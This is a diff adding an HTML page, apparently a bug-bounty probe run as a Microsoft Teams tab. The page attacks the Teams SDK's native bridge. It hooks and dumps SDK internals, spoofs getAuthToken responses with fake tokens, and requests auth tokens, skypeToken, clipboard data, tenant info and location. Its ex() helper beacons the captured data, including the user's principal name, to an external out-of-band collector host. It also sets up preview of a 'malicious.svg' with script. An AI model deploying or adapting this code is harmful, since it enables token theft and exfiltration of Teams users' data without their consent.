@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bridge Deep</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:72vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#58a6ff; font-size:11px; }
+  button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:4px 8px; margin:1px; border-radius:4px; cursor:pointer; font-size:9px; }
+  .g1 button { border-color:#f0883e; color:#f0883e; }
+  .g2 button { border-color:#3fb950; color:#3fb950; }
+  .g3 button { border-color:#bc8cff; color:#bc8cff; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>INTERNAL STATE (read SDK internals)</b></div>
+<div class="g1">
+  <button onclick="readCallbacks()">S1: callbacks</button>
+  <button onclick="readHandlers()">S2: handlers</button>
+  <button onclick="readLocalHandlerMap()">S3: localHandlerMap</button>
+  <button onclick="dumpAllProps()">S4: dump all props</button>
+  <button onclick="callDebugLog()">S5: debugLog</button>
+</div>
+
+<div class="section"><b>RESPONSE SPOOFING + DIRECT CALLS</b></div>
+<div class="g2">
+  <button onclick="spoofResponse()">RS1: spoof getAuthToken</button>
+  <button onclick="callSdkRequest()">RS2: sdkRequest</button>
+  <button onclick="callProcessMsg()">RS3: processMessageReq</button>
+  <button onclick="interceptResponses()">RS4: intercept ALL</button>
+</div>
+
+<div class="section"><b>AUTH TOKEN + CUSTOM MSG (from test14)</b></div>
+<div class="g3">
+  <button onclick="bridgeGetToken()">NI2: getAuthToken</button>
+  <button onclick="bridgeCustomMsg()">NI4: customMsg</button>
+  <button onclick="bridgeInternalFuncs()">NI5: internal funcs</button>
+  <button onclick="svgPreview()">FP: SVG preview</button>
+  <button onclick="copyOut()">COPY</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var msgId = 2000;
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+function safStr(obj, d) {
+  if (d === undefined) d = 2;
+  if (d <= 0) return String(obj);
+  if (obj === null) return 'null';
+  if (obj === undefined) return 'undefined';
+  var t = typeof obj;
+  if (t === 'string') return '"' + obj.substring(0, 300) + '"';
+  if (t === 'number' || t === 'boolean') return String(obj);
+  if (t === 'function') return '[fn ' + (obj.name || '?') + ']';
+  if (Array.isArray(obj)) return '[' + obj.slice(0,8).map(function(v){return safStr(v,d-1)}).join(', ') + ']';
+  if (t === 'object') {
+    var k; try{k=Object.getOwnPropertyNames(obj)}catch(e){try{k=Object.keys(obj)}catch(e2){return '[obj]'}}
+    return '{' + k.slice(0,20).map(function(p){try{return p+':'+safStr(obj[p],d-1)}catch(e){return p+':err'}}).join(', ') + '}';
+  }
+  return String(obj);
+}
+
+var NI = null; // nativeInterface reference
+
+// ================================================================
+// INIT — save reference to nativeInterface BEFORE SDK overwrites
+// ================================================================
+// Capture nativeInterface early
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  // Hook ALL response methods to capture responses
+  var origHandleResponse = NI.handleResponseFromNative;
+  var origHandlePartial = NI.handlePartialResponseFromNative;
+  var origHandleHandler = NI.handleResponseHandlerFromNative;
+
+  NI.handleResponseFromNative = function() {
+    log('[handleResponseFromNative] ' + safStr(Array.from(arguments), 3).substring(0, 500), 'crit');
+    ex('t15-response', { data: safStr(Array.from(arguments), 3).substring(0, 400) });
+    if (origHandleResponse) return origHandleResponse.apply(this, arguments);
+  };
+
+  NI.handlePartialResponseFromNative = function() {
+    log('[handlePartialResponseFromNative] ' + safStr(Array.from(arguments), 3).substring(0, 500), 'crit');
+    ex('t15-partial', { data: safStr(Array.from(arguments), 3).substring(0, 400) });
+    if (origHandlePartial) return origHandlePartial.apply(this, arguments);
+  };
+
+  NI.handleResponseHandlerFromNative = function() {
+    log('[handleResponseHandlerFromNative] ' + safStr(Array.from(arguments), 3).substring(0, 500), 'crit');
+    ex('t15-handler-resp', { data: safStr(Array.from(arguments), 3).substring(0, 400) });
+    if (origHandleHandler) return origHandleHandler.apply(this, arguments);
+  };
+}
+
+(async function() {
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+    if (NI) log('nativeInterface: captured', 'crit');
+    else log('nativeInterface: NOT FOUND', 'fail');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+})();
+
+function bridgeSend(func, args, callback) {
+  var id = msgId++;
+  var request = { id: id, func: func, args: args || [], timestamp: Date.now(), apiVersionTag: 'v2_' + func };
+
+  if (callback) {
+    // Register callback in SDK's internal system if possible
+    if (NI && NI.callbacks) {
+      try { NI.callbacks[id] = callback; } catch(e) {}
+    }
+  }
+
+  if (NI && NI.framelessPostMessage) {
+    try {
+      NI.framelessPostMessage(JSON.stringify(request));
+      log('  >> bridge(' + func + ') id=' + id, 'ok');
+      return id;
+    } catch(e) {
+      log('  >> bridge error: ' + e.message, 'fail');
+    }
+  }
+  return null;
+}
+
+// ================================================================
+// S1: READ CALLBACKS — stored SDK callback functions
+// May contain pending auth callbacks, token handlers, etc.
+// ================================================================
+function readCallbacks() {
+  log('\n' + '='.repeat(50), 'info');
+  log('S1: nativeInterface.callbacks', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  try {
+    var cb = NI.callbacks;
+    log('typeof: ' + typeof cb, 'info');
+    if (cb) {
+      var keys;
+      try { keys = Object.keys(cb); } catch(e) { keys = []; }
+      log('Callback IDs: ' + keys.length + ' entries', keys.length > 0 ? 'crit' : 'warn');
+      for (var i = 0; i < Math.min(keys.length, 30); i++) {
+        var k = keys[i];
+        var v = cb[k];
+        var info = typeof v;
+        if (typeof v === 'function') {
+          info = v.toString().substring(0, 200);
+        } else {
+          info = safStr(v, 2).substring(0, 200);
+        }
+        log('  [' + k + '] ' + info, 'warn');
+      }
+      ex('t15-callbacks', { count: keys.length, keys: keys.join(',').substring(0, 400) });
+    }
+  } catch(e) {
+    log('Error: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// S2: READ HANDLERS — registered message handlers
+// ================================================================
+function readHandlers() {
+  log('\n' + '='.repeat(50), 'info');
+  log('S2: nativeInterface.handlers', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  try {
+    var h = NI.handlers;
+    log('typeof: ' + typeof h, 'info');
+    if (h) {
+      var keys;
+      try { keys = Object.keys(h); } catch(e) { keys = []; }
+      log('Handler names: ' + keys.length + ' entries', keys.length > 0 ? 'crit' : 'warn');
+      for (var i = 0; i < Math.min(keys.length, 50); i++) {
+        var k = keys[i];
+        log('  ' + k + ': ' + (typeof h[k]), 'ok');
+      }
+      ex('t15-handlers', { count: keys.length, names: keys.join(',').substring(0, 400) });
+    }
+  } catch(e) {
+    log('Error: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// S3: READ localHandlerMap
+// ================================================================
+function readLocalHandlerMap() {
+  log('\n' + '='.repeat(50), 'info');
+  log('S3: nativeInterface.localHandlerMap', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  try {
+    var m = NI.localHandlerMap;
+    log('typeof: ' + typeof m, 'info');
+    if (m) {
+      // Check if it's a Map
+      if (m instanceof Map) {
+        log('Is Map with ' + m.size + ' entries', 'crit');
+        m.forEach(function(v, k) {
+          log('  ' + k + ': ' + (typeof v), 'ok');
+        });
+      } else {
+        var keys = Object.keys(m);
+        log('Keys: ' + keys.join(', ').substring(0, 400), keys.length > 0 ? 'crit' : 'warn');
+      }
+      ex('t15-localhandlermap', { data: safStr(m, 2).substring(0, 400) });
+    }
+  } catch(e) {
+    log('Error: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// S4: DUMP ALL nativeInterface properties with values
+// ================================================================
+function dumpAllProps() {
+  log('\n' + '='.repeat(50), 'info');
+  log('S4: FULL nativeInterface DUMP', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  var keys = Object.getOwnPropertyNames(NI);
+  log('Total properties: ' + keys.length, 'info');
+
+  for (var i = 0; i < keys.length; i++) {
+    var k = keys[i];
+    try {
+      var v = NI[k];
+      var t = typeof v;
+
+      if (t === 'function') {
+        // Show function source (first 150 chars)
+        var src = v.toString().substring(0, 150);
+        log('  ' + k + '(): ' + src, 'ok');
+      } else if (t === 'object' && v !== null) {
+        log('  ' + k + ': ' + safStr(v, 1).substring(0, 200), 'warn');
+      } else {
+        log('  ' + k + ' = ' + String(v).substring(0, 100), 'info');
+      }
+    } catch(e) {
+      log('  ' + k + ': error — ' + e.message, 'fail');
+    }
+  }
+
+  // Also check logType — might reveal debug/verbose mode
+  log('\n  logType = ' + safStr(NI.logType, 1), NI.logType ? 'crit' : 'info');
+}
+
+// ================================================================
+// S5: CALL debugLog — may leak sensitive info
+// ================================================================
+function callDebugLog() {
+  log('\n' + '='.repeat(50), 'info');
+  log('S5: nativeInterface.debugLog', 'info');
+
+  if (!NI || !NI.debugLog) { log('No debugLog', 'fail'); return; }
+
+  try {
+    var result = NI.debugLog('test-from-attacker-tab');
+    log('debugLog returned: ' + safStr(result, 2), result ? 'crit' : 'info');
+  } catch(e) {
+    log('debugLog error: ' + e.message, 'fail');
+  }
+
+  // Try log and logScenario
+  try {
+    var logResult = NI.log('attacker-log-message');
+    log('log returned: ' + safStr(logResult, 2), 'info');
+  } catch(e) {}
+
+  try {
+    var scenarioResult = NI.logScenario('attacker-scenario');
+    log('logScenario returned: ' + safStr(scenarioResult, 2), 'info');
+  } catch(e) {}
+}
+
+// ================================================================
+// RS1: RESPONSE SPOOFING — fake a getAuthToken response
+// If we can inject fake responses into the SDK, we can trick
+// the app into thinking it got a valid token
+// ================================================================
+function spoofResponse() {
+  log('\n' + '='.repeat(50), 'info');
+  log('RS1: RESPONSE SPOOFING', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // First, let's make a real getAuthToken request to get its ID
+  var tokenId = bridgeSend('authentication.getAuthToken', [{}]);
+  log('Sent getAuthToken with id=' + tokenId, 'info');
+
+  // Now try to spoof a response using the native bridge methods
+  log('\n--- A: postSdkResponseWithId ---', 'info');
+  try {
+    // Try sending a fake success response
+    NI.postSdkResponseWithId(tokenId, ['fake-token-eyJhbGciOiJIUzI1NiJ9.test.test']);
+    log('postSdkResponseWithId called!', 'crit');
+  } catch(e) {
+    log('postSdkResponseWithId: ' + e.message, 'fail');
+  }
+
+  log('\n--- B: postSdkResponse ---', 'info');
+  try {
+    NI.postSdkResponse(['authentication.getAuthToken', true, 'fake-token']);
+    log('postSdkResponse called!', 'crit');
+  } catch(e) {
+    log('postSdkResponse: ' + e.message, 'fail');
+  }
+
+  log('\n--- C: postSdkResponseWithFunc ---', 'info');
+  try {
+    NI.postSdkResponseWithFunc('authentication.getAuthToken', ['fake-token-from-func']);
+    log('postSdkResponseWithFunc called!', 'crit');
+  } catch(e) {
+    log('postSdkResponseWithFunc: ' + e.message, 'fail');
+  }
+
+  log('\n--- D: sdkEncodedResponseHandler ---', 'info');
+  try {
+    NI.sdkEncodedResponseHandler(JSON.stringify({
+      id: tokenId,
+      args: [null, 'fake-encoded-token']
+    }));
+    log('sdkEncodedResponseHandler called!', 'crit');
+  } catch(e) {
+    log('sdkEncodedResponseHandler: ' + e.message, 'fail');
+  }
+
+  // Also try handleResponseFromNative directly
+  log('\n--- E: handleResponseFromNative ---', 'info');
+  try {
+    NI.handleResponseFromNative(JSON.stringify({
+      id: tokenId,
+      args: [null, 'fake-handle-response-token']
+    }));
+    log('handleResponseFromNative called!', 'crit');
+  } catch(e) {
+    log('handleResponseFromNative: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// RS2: sdkRequest — make native SDK requests directly
+// ================================================================
+function callSdkRequest() {
+  log('\n' + '='.repeat(50), 'info');
+  log('RS2: nativeInterface.sdkRequest', 'info');
+
+  if (!NI || !NI.sdkRequest) { log('No sdkRequest', 'fail'); return; }
+
+  var requests = [
+    JSON.stringify({ func: 'authentication.getAuthToken', args: [{}], id: msgId++, timestamp: Date.now() }),
+    JSON.stringify({ func: 'getContext', args: [], id: msgId++, timestamp: Date.now() }),
+    JSON.stringify({ func: 'getConfigSetting', args: ['accessToken'], id: msgId++, timestamp: Date.now() }),
+    JSON.stringify({ func: 'clipboard.readFromClipboard', args: [], id: msgId++, timestamp: Date.now() }),
+    JSON.stringify({ func: 'getUserJoinedTeams', args: [], id: msgId++, timestamp: Date.now() }),
+  ];
+
+  for (var r of requests) {
+    try {
+      var parsed = JSON.parse(r);
+      var result = NI.sdkRequest(r);
+      log('  sdkRequest(' + parsed.func + '): ' + safStr(result, 2).substring(0, 200), result ? 'crit' : 'ok');
+    } catch(e) {
+      log('  sdkRequest error: ' + e.message, 'fail');
+    }
+  }
+}
+
+// ================================================================
+// RS3: processMessageRequest — inject fake messages into SDK
+// ================================================================
+function callProcessMsg() {
+  log('\n' + '='.repeat(50), 'info');
+  log('RS3: processMessageRequest', 'info');
+
+  if (!NI || !NI.processMessageRequest) { log('No processMessageRequest', 'fail'); return; }
+
+  var fakeMessages = [
+    { func: 'themeChange', args: ['dark'] },
+    { func: 'fullScreenChange', args: [true] },
+    { func: 'backButtonPress', args: [] },
+    { func: 'focusEnter', args: [true] },
+    { func: 'startConversation', args: [{ conversationType: 'chat', subEntityId: 'test' }] },
+  ];
+
+  for (var msg of fakeMessages) {
+    try {
+      var result = NI.processMessageRequest(JSON.stringify(msg));
+      log('  processMsg(' + msg.func + '): ' + safStr(result, 2).substring(0, 200), 'ok');
+    } catch(e) {
+      log('  processMsg(' + msg.func + '): ' + e.message.substring(0, 60), 'fail');
+    }
+  }
+}
+
+// ================================================================
+// RS4: INTERCEPT ALL — hook every method to see traffic
+// ================================================================
+function interceptResponses() {
+  log('\n' + '='.repeat(50), 'info');
+  log('RS4: INTERCEPTING ALL BRIDGE METHODS', 'info');
+
+  if (!NI) { log('No nativeInterface', 'fail'); return; }
+
+  // isValidSdkRequest — understand validation
+  log('\n--- isValidSdkRequest ---', 'info');
+  try {
+    var testReq = JSON.stringify({ func: 'test', args: [], id: 9999, timestamp: Date.now() });
+    var valid = NI.isValidSdkRequest(testReq);
+    log('isValidSdkRequest({func:"test"}): ' + valid, valid ? 'crit' : 'info');
+
+    var authReq = JSON.stringify({ func: 'authentication.getAuthToken', args: [{}], id: 9998 });
+    var valid2 = NI.isValidSdkRequest(authReq);
+    log('isValidSdkRequest(getAuthToken): ' + valid2, valid2 ? 'crit' : 'info');
+  } catch(e) {
+    log('isValidSdkRequest error: ' + e.message, 'fail');
+  }
+
+  // Hook postMessage too
+  var origPM = NI.postMessage;
+  NI.postMessage = function() {
+    log('[NI.postMessage] ' + safStr(Array.from(arguments), 2).substring(0, 300), 'crit');
+    return origPM.apply(this, arguments);
+  };
+
+  // Hook postWindowMessage
+  var origPWM = NI.postWindowMessage;
+  NI.postWindowMessage = function() {
+    log('[NI.postWindowMessage] ' + safStr(Array.from(arguments), 2).substring(0, 300), 'crit');
+    return origPWM.apply(this, arguments);
+  };
+
+  log('All bridge methods hooked — now run other tests to see traffic', 'ok');
+}
+
+// ================================================================
+// NI2: AUTH TOKEN VIA BRIDGE (from test14)
+// ================================================================
+function bridgeGetToken() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI2: AUTH TOKEN VIA BRIDGE', 'info');
+
+  bridgeSend('authentication.getAuthToken', [{ resource: 'https://graph.microsoft.com' }]);
+  bridgeSend('authentication.getAuthToken', [{}]);
+  bridgeSend('getAuthToken', []);
+  bridgeSend('getConfigSetting', ['accessToken']);
+  bridgeSend('getConfigSetting', ['skypeToken']);
+  bridgeSend('authentication.authenticate', [{
+    url: 'https://' + C + '/ni2-auth?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+    width: 600, height: 535
+  }]);
+
+  log('6 auth probes sent — waiting for responses...', 'info');
+}
+
+// ================================================================
+// NI4: CUSTOM MESSAGES (from test14)
+// ================================================================
+function bridgeCustomMsg() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI4: CUSTOM MESSAGES', 'info');
+
+  var funcs = [
+    'getUserJoinedTeams', 'getChatMembers', 'getContext',
+    'getConfigSetting', 'readFromClipboard',
+    'permissions.has', 'getLocation',
+    'executeDeepLink', 'getUserInfo',
+  ];
+
+  var args_map = {
+    'getConfigSetting': ['authToken'],
+    'permissions.has': ['media'],
+    'getLocation': [{ allowChooseLocation: false, showMap: false }],
+    'executeDeepLink': ['https://' + C + '/ni4-deeplink'],
+  };
+
+  for (var f of funcs) {
+    bridgeSend(f, args_map[f] || []);
+  }
+
+  log(funcs.length + ' custom messages sent', 'info');
+}
+
+// ================================================================
+// NI5: INTERNAL FUNCTIONS (from test14)
+// ================================================================
+function bridgeInternalFuncs() {
+  log('\n' + '='.repeat(50), 'info');
+  log('NI5: INTERNAL FUNCTIONS', 'info');
+
+  var internals = [
+    { func: 'nestedAppAuth.execute', args: [{ messageType: 'NestedAppAuth', method: 'GetToken', requestId: 'x' }] },
+    { func: 'nestedAppAuth.getToken', args: [{ scopes: ['User.Read'] }] },
+    { func: 'tasks.getTaskInfo', args: [] },
+    { func: 'getUserInfo', args: [] },
+    { func: 'getSettings', args: [] },
+    { func: 'getTenantInfo', args: [] },
+    { func: 'messageChannels.telemetry.getChannel', args: [] },
+  ];
+
+  for (var f of internals) {
+    bridgeSend(f.func, f.args);
+  }
+
+  log(internals.length + ' internal calls sent', 'info');
+}
+
+// ================================================================
+// FP: SVG FILE PREVIEW — malicious SVG with JS
+// Host on GitHub pages, then preview via bridge
+// ================================================================
+function svgPreview() {
+  log('\n' + '='.repeat(50), 'info');
+  log('FP: SVG FILE PREVIEW WITH JS', 'info');
+
+  // SVG hosted on our GitHub pages (needs to be deployed)
+  var svgUrl = 'https://pedrojuniorrd.github.io/_layouts/malicious.svg';
+
+  var params = [
+    'svg-' + Date.now(),   // entityId
+    'architecture.svg',     // title
+    'Team architecture',    // description
+    'svg',                  // type
+    svgUrl,                 // objectUrl
+    svgUrl,                 // downloadUrl
+    svgUrl,                 // webPreviewUrl
+    '',                     // webEditUrl
+    'https://pedrojuniorrd.github.io/_layouts/', // baseUrl
+    false,                  // editFile
+    '',                     // subEntityId
+    'view',                 // viewerAction
+    0,                      // fileOpenPreference
+    '',                     // conversationId
+    2048,                   // sizeInBytes
+    '', '', '', '', ''      // remaining params
+  ];
+
+  bridgeSend('openFilePreview', params);
+  log('SVG preview sent — deploy malicious.svg first!', 'warn');
+  ex('t15-svg-sent', { url: svgUrl });
+}
+</script>
+</body>
+</html>
